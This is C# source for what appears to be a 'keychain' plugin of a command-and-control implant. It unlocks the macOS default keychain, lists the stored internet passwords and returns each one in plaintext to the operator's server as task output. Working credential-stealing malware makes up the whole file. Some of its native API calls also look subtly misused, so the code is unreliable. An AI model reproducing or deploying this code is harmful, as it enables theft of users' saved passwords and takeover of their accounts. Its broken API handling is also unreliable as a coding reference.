using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Text;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "keychain";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            await messageManager.AddResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = DisplayKeychainContents(),
                completed = true
            });
        }
        public string DisplayKeychainContents()
        {
            IntPtr keychain = IntPtr.Zero;
            StringBuilder sb = new StringBuilder();

            try
            {
                // Unlock the default keychain
                if (Native.SecKeychainCopyDefault(ref keychain) == Native.errSecSuccess)
                {
                    if (UnlockKeychain(keychain))
                    {
                        // Fetch and display keychain items
                        sb.AppendLine(FetchAndDisplayKeychainItems(keychain));
                    }
                    else
                    {
                        sb.AppendLine("Failed to unlock the keychain.");
                    }
                }
                else
                {
                    sb.AppendLine("Failed to get the default keychain.");
                }
            }
            finally
            {
                if (keychain != IntPtr.Zero)
                {
                    Native.SecKeychainItemFreeContent(keychain);
                }
            }
            return sb.ToString();
        }

        private bool UnlockKeychain(IntPtr keychain)
        {
            const int passwordLength = 0; // Keychain password is not required for unlocking

            int result = Native.SecKeychainUnlock(keychain, (uint)passwordLength, null, Native.kSecUnlockStateStatus);

            return result == Native.errSecSuccess;
        }

        private string FetchAndDisplayKeychainItems(IntPtr keychain)
        {
            IntPtr searchRef = IntPtr.Zero;
            StringBuilder sb = new StringBuilder();
            try
            {
                if (Native.SecKeychainSearchCreateFromAttributes(keychain, Native.kSecClassInternetPassword, IntPtr.Zero, ref searchRef) == Native.errSecSuccess)
                {
                    IntPtr itemRef = IntPtr.Zero;

                    while (Native.SecKeychainSearchCopyNext(searchRef, ref itemRef) == Native.errSecSuccess)
                    {
                        sb.AppendLine(DisplayKeychainItemContent(itemRef));
                        Native.SecKeychainItemFreeContent(itemRef);
                    }
                }
                else
                {
                    sb.AppendLine("Failed to create keychain search.");
                }
            }
            finally
            {
                if (searchRef != IntPtr.Zero)
                {
                    Native.SecKeychainItemFreeContent(searchRef);
                }
            }
            return sb.ToString();
        }

        private string DisplayKeychainItemContent(IntPtr itemRef)
        {
            int length = 0;
            IntPtr data = IntPtr.Zero;
            StringBuilder sb = new StringBuilder();
            try
            {
                if (Native.SecKeychainItemCopyContent(itemRef, ref length, ref data) == Native.errSecSuccess)
                {
                    byte[] passwordBytes = new byte[length];
                    Marshal.Copy(data, passwordBytes, 0, length);

                    string password = Encoding.UTF8.GetString(passwordBytes);
                    sb.AppendFormat($"Keychain Item Password: {password}" + Environment.NewLine);
                }
                else
                {
                    sb.AppendLine("Failed to copy keychain item content.");
                }
            }
            finally
            {
                if (data != IntPtr.Zero)
                {
                    Native.SecKeychainItemFreeContent(data);
                }
            }

            return sb.ToString();
        }
    }
}
